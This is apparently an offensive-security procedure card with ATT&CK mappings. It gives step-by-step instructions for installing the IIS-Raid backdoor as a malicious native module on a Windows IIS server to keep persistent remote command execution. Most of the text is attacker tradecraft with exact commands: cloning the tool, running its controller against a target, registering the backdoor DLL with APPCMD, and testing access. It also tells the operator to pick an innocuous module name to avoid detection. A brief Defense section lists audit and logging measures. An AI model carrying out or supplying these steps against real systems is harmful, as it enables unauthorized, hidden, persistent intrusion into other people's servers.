---
id: 22ea5c64-525e-4bb5-991d-b7f0bf1616e3
name: IIS-Raid-Backdoor-Persistence
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:27.938270+00:00'
updated_at: '2023-04-10T20:37:21.181863+00:00'
tactics:
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Create or Modify System Process|T1543 - Create or Modify System
    Process]]
  - '[[techniques/New Service|T1050 - New Service]]'
sub_techniques:
  - '[[sub-techniques/Windows Service|T1543.003 - Windows Service]]'
tags:
  - '[[tags/IIS]]'
  - '[[tags/Serviceland]]'
  - '[[tags/Windows - Persistence]]'
commands:
  - '[[commands/git-clone-iis-raid-repo]]'
  - '[[commands/python-execute-iis-controller]]'
  - '[[commands/appcmd-install-iis-backdoor-module]]'
platforms:
  - Windows
tools:
  - '[[tools/iis-raid]]'
validated: true
---

# IIS-Raid-Backdoor-Persistence

## Summary

This procedure uses the IIS-Raid tool to establish a persistent backdoor on a Windows IIS server by installing a malicious native module. The backdoor allows remote command execution and maintains access even after reboots by leveraging Windows services or process modifications.

## Description

The IIS-Raid-Backdoor-Persistence technique targets Internet Information Services (IIS) on Windows servers, commonly used for web hosting. After initial access to the target (e.g., via exploitation or credentials), the attacker clones the IIS-Raid repository on their control machine, uses a Python controller script to interact with the target IIS instance (uploading or configuring the backdoor), and installs a custom DLL module using the native APPCMD tool. This module acts as a backdoor, enabling persistent remote access for command execution, file upload, or further tooling. The approach is stealthy as it blends with legitimate IIS modules and survives system restarts through service integration. It is effective in enterprise environments with exposed IIS servers and requires administrative privileges on the target for module installation.

## Requirements

1. Initial access to the target Windows IIS server (e.g., shell or remote execution capability).
2. Administrative privileges on the target to install IIS modules.
3. Attacker machine with Git and Python installed.
4. Network connectivity to the target IIS server (HTTP/HTTPS access).
5. IIS-Backdoor.dll generated or provided by the IIS-Raid tool.

## Defense

- Regularly audit IIS modules using `appcmd list modules` and monitor for unauthorized additions.
- Implement principle of least privilege, restricting module installation to trusted admins.
- Enable Windows Event Logging for service creation/modification (Event ID 7045) and IIS logs for unusual requests.
- Use endpoint detection tools to scan for suspicious DLLs in %windir%\System32\inetsrv\.
- Apply web application firewalls (WAF) to block anomalous administrative requests to IIS.

## Objectives

1. Install a malicious IIS module to create a persistent backdoor.
2. Enable remote command execution via the backdoor for long-term access.
3. Ensure the backdoor survives reboots through service persistence.

## Instructions

### Step 1: Clone IIS-Raid Repository

**Context**: Obtain the IIS-Raid tool source code on your attacker machine to prepare the backdoor components.

**Command** ([[commands/git-clone-iis-raid-repo]]):
```bash
git clone https://github.com/0x09AL/IIS-Raid
```

This clones the repository containing the iis_controller.py script and backdoor DLL templates. Navigate to the cloned directory after execution.

**Expected Output**: Repository cloned successfully, with files like iis_controller.py visible in the new IIS-Raid directory.

### Step 2: Execute IIS Controller Script

**Context**: Use the Python script to connect to the target IIS server, authenticate with a password, and prepare/upload the backdoor module remotely.

**Command** ([[commands/python-execute-iis-controller]]):
```bash
python iis_controller.py --url http://$_TARGET_URL/ --password $_PASSWORD
```

Replace placeholders with the target's IIS URL and a simple password for backdoor authentication. This step handles remote configuration and may exploit or use existing access to stage the backdoor.

**Expected Output**: Script output confirming connection to the target, module upload success, and backdoor activation (e.g., "Backdoor installed successfully").

If the script fails due to authentication, ensure initial access is established and the URL is reachable.

### Step 3: Install Backdoor Module on Target

**Context**: On the target system (via shell or remote execution), register the malicious DLL as an IIS native module to enable persistence.

**Command** ([[commands/appcmd-install-iis-backdoor-module]]):
```cmd
C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:"$_MODULE_NAME" /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true
```

Execute this on the target Windows machine. The DLL should be placed in the specified path by the previous step. Use a innocuous module name to evade detection.

**Expected Output**: Success message like "Module object "$_MODULE_NAME" added".

Verify installation with `appcmd list modules` to see the new module listed.

### Step 4: Verify Backdoor Persistence

**Context**: Test the backdoor by sending commands via the controller script or direct HTTP requests to confirm remote access.

Use the iis_controller.py with appropriate flags to execute a test command (e.g., whoami). If successful, the backdoor is persistent.

**Expected Output**: Response from the target showing command execution output, confirming access.

**Success Indicators**:
- Module listed in IIS configuration without errors.
- Remote commands execute successfully via backdoor.
- Backdoor survives target reboot.
